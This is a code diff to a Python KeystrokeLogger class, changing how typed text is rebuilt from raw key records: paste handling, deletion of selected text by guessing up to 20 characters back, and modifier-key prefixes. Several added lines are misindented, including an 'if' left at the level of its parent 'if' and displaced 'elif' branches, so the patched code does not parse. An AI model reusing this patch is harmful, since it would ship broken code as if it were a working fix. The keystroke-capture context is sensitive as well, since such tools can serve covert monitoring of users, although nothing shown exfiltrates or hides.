@@ -160,13 +160,15 @@ class KeystrokeLogger:
                         paste_content = special[8:-2]  # Remove [WIN+V:" and "]
                         result.extend(list(paste_content))
                     elif special == '[SEL+DELETE]':
-                        # Selection was deleted - we can't know cursor position
-                        # so we can't accurately reconstruct. Leave text as-is.
-                        # The raw keys field will show what really happened.
-                        pass
-                    elif special in ['[CTRL+ ]', '[SHIFT+ ]', '[ALT+ ]', '[WIN+ ]']:
-                        # Space with modifier - still treat as space
-                        result.append(' ')
+                        # Selection was deleted - we don't know how much was selected
+                        # Try to be smart: look back for word boundaries if Ctrl was involved
+                        # For now, delete back to the last space or up to 20 chars
+                        deleted = 0
+                        while result and deleted < 20:
+                            char = result.pop()
+                            deleted += 1
+                            if char == ' ' or char == '\n':
+                                break
                     elif special.startswith('[CTRL+SHIFT+') or special.startswith('[SHIFT+'):
                         # Selection operations don't produce text, skip them
                         pass
@@ -215,7 +217,7 @@ class KeystrokeLogger:
                 else:
                     # Unclosed bracket, treat as regular character
                     result.append(raw_keys[i])
-                    i += 1
+                        i += 1
                     continue
             
             # Regular character
@@ -404,9 +406,8 @@ class KeystrokeLogger:
                     char = '[WIN+V]'
             
             # Add modifier prefixes for shortcuts (if not already handled)
-            # Don't convert space to a shortcut - it should always be a space
-            if char and not char.startswith('[') and char != ' ':
-                if self.ctrl_pressed:
+            if char and not char.startswith('['):
+            if self.ctrl_pressed:
                     char = f'[CTRL+{char.upper()}]'
                 elif self.alt_pressed:
                     char = f'[ALT+{char.upper()}]'
@@ -420,14 +421,14 @@ class KeystrokeLogger:
                         # Ctrl+Shift+Arrow = select by word
                         char = f'[CTRL+SHIFT+{char[1:-1]}]'
                         self.selection_active = True
-                    elif char == '[BACKSPACE]':
+                elif char == '[BACKSPACE]':
                         char = '[CTRL+SHIFT+BACKSPACE]'
                     elif char == '[DELETE]':
                         char = '[CTRL+SHIFT+DELETE]'
                 elif self.ctrl_pressed:
                     if char == '[BACKSPACE]':
                         char = '[CTRL+BACKSPACE]'
-                    elif char == '[DELETE]':
+                elif char == '[DELETE]':
                         char = '[CTRL+DELETE]'
                     elif char in ['[LEFT]', '[RIGHT]']:
                         # Ctrl+Arrow = word navigation
